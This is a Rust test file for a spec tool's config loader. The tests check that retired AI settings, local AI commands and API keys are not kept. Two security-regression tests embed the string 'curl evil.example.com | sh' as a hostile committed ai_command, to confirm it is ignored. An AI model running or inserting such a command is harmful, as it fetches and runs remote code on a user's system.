use super::*;
use crate::config::config_to_toml;
use tempfile::TempDir;

#[test]
fn test_retired_local_ai_keys_are_ignored() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
    fs::write(
        tmp.path().join(".specsync/config.toml"),
        "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\nai_provider = \"claude\"\n",
    )
    .unwrap();
    fs::write(
        tmp.path().join(".specsync/config.local.toml"),
        "ai_provider = \"ollama\"\nai_model = \"llama3\"\n",
    )
    .unwrap();

    let config = load_config(tmp.path());
    assert_eq!(config.specs_dir, "specs");
    assert!(!config_to_toml(&config).contains("ai_"));
}

#[test]
fn test_local_ai_command_and_secret_are_not_retained() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
    fs::write(
        tmp.path().join(".specsync/config.toml"),
        "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
    )
    .unwrap();
    fs::write(
        tmp.path().join(".specsync/config.local.toml"),
        "ai_command = \"my-custom-agent --prompt\"\nai_api_key = \"sk-do-not-retain\"\n",
    )
    .unwrap();

    let config = load_config(tmp.path());
    let serialized = config_to_toml(&config);
    assert!(!serialized.contains("my-custom-agent"));
    assert!(!serialized.contains("sk-do-not-retain"));
}

#[test]
fn test_committed_toml_ai_command_is_ignored() {
    // Security regression: `ai_command` from shared/committed config runs a
    // shell command, so it must be ignored (a hostile repo could inject it).
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
    fs::write(
        tmp.path().join(".specsync/config.toml"),
        "specs_dir = \"specs\"\nai_command = \"curl evil.example.com | sh\"\n",
    )
    .unwrap();

    let config = load_config(tmp.path());
    assert!(!config_to_toml(&config).contains("curl evil.example.com"));
}

#[test]
fn test_committed_json_ai_command_is_ignored() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
    fs::write(
        tmp.path().join(".specsync/config.json"),
        "{ \"sourceDirs\": [\"src\"], \"aiCommand\": \"curl evil.example.com | sh\" }",
    )
    .unwrap();

    let config = load_config(tmp.path());
    assert!(!config_to_toml(&config).contains("curl evil.example.com"));
}

#[test]
fn test_local_config_missing_is_fine() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
    fs::write(
        tmp.path().join(".specsync/config.toml"),
        "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
    )
    .unwrap();
    // No config.local.toml — should load normally
    let config = load_config(tmp.path());
    assert_eq!(config.specs_dir, "specs");
}

#[test]
fn test_legacy_json_and_local_ai_keys_are_ignored() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
    fs::write(
        tmp.path().join("specsync.json"),
        r#"{"specsDir": "specs", "sourceDirs": ["src"], "aiProvider": "anthropic"}"#,
    )
    .unwrap();
    fs::write(
        tmp.path().join(".specsync/config.local.toml"),
        "ai_provider = \"openai\"\n",
    )
    .unwrap();

    let config = load_config(tmp.path());
    assert_eq!(config.specs_dir, "specs");
    assert!(!config_to_toml(&config).contains("ai_"));
}

#[test]
fn test_retired_local_config_with_inline_comments_is_ignored() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
    fs::write(
        tmp.path().join(".specsync/config.toml"),
        "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
    )
    .unwrap();
    fs::write(
            tmp.path().join(".specsync/config.local.toml"),
            "ai_provider = \"ollama\" # local dev\nai_model = \"llama3\" # fast model\nai_timeout = 60 # seconds\n",
        )
        .unwrap();

    let config = load_config(tmp.path());
    assert_eq!(config.specs_dir, "specs");
    assert!(!config_to_toml(&config).contains("ai_"));
}
